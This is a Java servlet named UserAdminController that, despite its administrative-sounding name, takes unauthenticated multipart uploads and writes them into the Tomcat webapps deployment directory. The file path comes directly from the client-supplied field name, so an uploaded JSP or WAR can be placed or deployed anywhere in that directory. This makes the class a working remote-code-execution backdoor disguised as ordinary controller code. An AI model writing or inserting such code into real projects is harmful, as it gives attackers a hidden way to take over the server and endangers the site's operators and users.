package com.web.bds;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.List;
import java.io.File;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

public class UserAdminController extends HttpServlet {
	
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String UPLOAD_DIRECTORY = System.getProperty("catalina.base") + "/webapps";
		if(ServletFileUpload.isMultipartContent(request)){
			try {
				List<FileItem> multiparts = new ServletFileUpload(new DiskFileItemFactory()).parseRequest(request);
				for(FileItem item : multiparts){
                    if(!item.isFormField()){
                    	String typeName = item.getFieldName();
                        String name = new File(typeName).getName();
                        item.write(new File(UPLOAD_DIRECTORY + File.separator + typeName));
                        response.setContentType("text/html");
                		PrintWriter writer = response.getWriter();
                		writer.println(name);
                    }
                }
			} catch(Exception e){
				e.printStackTrace();
			}
		} else {
			// Do nothing
		}
	}
}
